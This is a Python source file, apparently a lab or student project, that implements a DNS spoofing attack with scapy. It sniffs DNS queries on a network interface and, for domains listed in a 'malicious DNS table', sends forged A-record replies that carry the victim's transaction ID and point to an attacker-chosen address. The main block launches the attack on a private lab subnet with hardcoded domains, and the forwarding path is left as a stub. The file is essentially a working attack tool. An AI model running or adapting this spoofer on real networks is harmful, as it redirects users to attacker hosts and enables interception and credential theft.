from struct import pack
from xmlrpc.client import Boolean
from scapy.all import DNS, UDP, IP, DNSRR, DNSQR , sr1, send, sniff
from scapy.layers.l2 import Ether

from utils.interface import InterfaceConfig


class DNSSpoof:

	def __init__(
		self,
		net_interface: InterfaceConfig,
		forward: Boolean = False,
		mal_dns_table={},
	) -> None:

		self.BPF = "udp port 53"
		self.NET_INTERFACE = net_interface
		self.mal_dns_table = mal_dns_table

	def query_user(self):
		pass

	def start_attack(self) -> None:
		sniff(filter=self.BPF,
			iface=self.NET_INTERFACE.INTERFACE_NAME,
			prn=self.analyze_packet)

		# print(packet[0].show())
		self.analyze_packet(packet[0])

	def analyze_packet(self, packet: Ether):

		print(f"[ANALYZING]: {packet.summary()}\n")

		# check for proper DNS reqs only
		if not packet.haslayer(DNS) or not packet.haslayer(IP):
			return

		# might want to consider ICMP packets

		# ignore our packets
		if packet[IP].src == self.NET_INTERFACE.IP_ADDR:
			return

		# only respond to queries
		if packet[DNS].qr != 0:
			return

		# get name of requested hosts
		# skip last character cuz it's always a '.'
		# decode cuz it comes as byte stream
		queried_name = packet[DNS].qd.qname[:-1].decode()
		print(queried_name)

		if queried_name in self.mal_dns_table:
			
			reply = self.spoof_packet(queried_name, packet)
			print(f"AFTER: \n\n  {reply.show()}")
			send(reply)
		else:
			self.forward_packet(queried_name, packet)

	def forward_packet(self, query: str, packet: Ether):
		print(f"[FORWARDING]: {packet.summary()}\n")

	def spoof_packet(self, query: str, packet: Ether):
		print(f"[SPOOFING]: Packet {packet.summary()}\n")
		print(f"\tBefore: \n {packet.show()}")

		spoofed_ip = self.mal_dns_table[query]

		# craft the spoofed DNS reply
		spoofed_reply = IP() / UDP() / DNS()

		# swap source/dest for UDP and IP layers
		spoofed_reply[IP].src = packet[IP].dst
		spoofed_reply[IP].dst = packet[IP].src
		spoofed_reply[UDP].sport = packet[UDP].dport
		spoofed_reply[UDP].dport = packet[UDP].sport

		# copy the TX ID
		spoofed_reply[DNS].id = packet[DNS].id
		spoofed_reply[DNS].qr = 1 # response (0 is request)
		spoofed_reply[DNS].aa = 0
		spoofed_reply[DNS].qd = packet[DNS].qd # pass the DNS Question Record to the resposne
		spoofed_reply[DNS].an = DNSRR(rrname=query+'.', rdata=spoofed_ip, type="A", rclass="IN")

		# print(spoofed_reply.summary())
		return spoofed_reply




if __name__ == "__main__":
	print("Running...")

	interface_config = InterfaceConfig("eth0", "08:00:27:95:bd:54",
									   "192.168.56.169")

	dns_att = DNSSpoof(net_interface= interface_config, mal_dns_table= {
		"muievladimir2.com": "192.168.56.102",
		"www.muie.com": "192.168.56.102",
		"www.muie2.com": "192.168.56.102",
		"www.mortiimei.com": "192.168.56.102",
	})
	dns_att.start_attack()
